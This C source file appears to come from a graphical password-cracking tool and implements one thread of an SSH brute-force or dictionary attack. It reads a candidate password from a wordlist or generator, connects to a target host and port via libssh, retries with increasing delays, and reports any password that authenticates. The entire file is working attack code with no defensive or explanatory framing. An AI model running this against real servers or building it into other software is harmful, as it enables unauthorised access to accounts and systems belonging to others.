#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <libssh/libssh.h>
#include <libssh/callbacks.h>
#include <time.h>
#include "../interface/interface.h"
#include "../struct/gtkstruct.h"
#include "requests.h"

void * sendRequestSSH(void * attackstack){

  // mutex pour le multithreading

  time_t chrono;

  pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
  pthread_cond_t cond_stock = PTHREAD_COND_INITIALIZER;

  pthread_mutex_lock(&mutex);
  pthread_setcancelstate(PTHREAD_CANCEL_DISABLE,NULL);
  struct AttackStack * attackStackPtr = (struct AttackStack*) attackstack;
  char password[255];
  double timeout = DEFAULT_DELAY;
  double increment = DELAY_INCREMENT;
  int tries = 0;

  if (attackStackPtr->dic == 1){
    fgets(password,100,attackStackPtr->file);
    if (password[strlen(password)-1] == '\n'){
      password[strlen(password)-1] = 0;
    }
  } else {
    if  (attackStackPtr->bruteIter >= attackStackPtr->bruteCount){
      attackStackPtr->handler->stopped = 1;
      pthread_mutex_unlock(&mutex);
      pthread_setcancelstate(PTHREAD_CANCEL_ENABLE,NULL);
      pthread_exit(NULL);
    } else {
      strcpy(password,getNextPassword(attackStackPtr));
    }
  }
  pthread_mutex_unlock(&mutex);

  ssh_session session;
  session = ssh_new();
  int rc;

  ssh_options_set(session,SSH_OPTIONS_USER,attackStackPtr->username);
  ssh_options_set(session,SSH_OPTIONS_HOST,attackStackPtr->destination);
  ssh_options_set(session,SSH_OPTIONS_PORT,&(attackStackPtr->port));
  rc = ssh_connect(session);
  chrono = time(NULL);

  while (rc == SSH_ERROR && tries <= MAX_TRIES && (attackStackPtr->handler)->stopped == 0){
    if (tries == 0){
      g_idle_add_full(100,timeOutIncrease,(gpointer)attackStackPtr,NULL);
    }
    ssh_disconnect(session);
    usleep(timeout);
    tries++;
    timeout+=increment;
    increment *= 2;
    rc = ssh_connect(session);
  }

  if (rc == SSH_ERROR && (attackStackPtr->handler)->stopped == 0){
    strcpy(attackStackPtr->errorMessage ,ssh_get_error(session) );
    g_idle_add_full(100,timeOutError,(gpointer)attackStackPtr,NULL);
  }

  rc = ssh_userauth_password(session,NULL,password);
  if(rc == SSH_AUTH_SUCCESS){
    authSuccess(password,attackStackPtr);
  }
  ssh_disconnect(session);
  ssh_free(session);

  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE,NULL);
  pthread_exit(NULL);
}
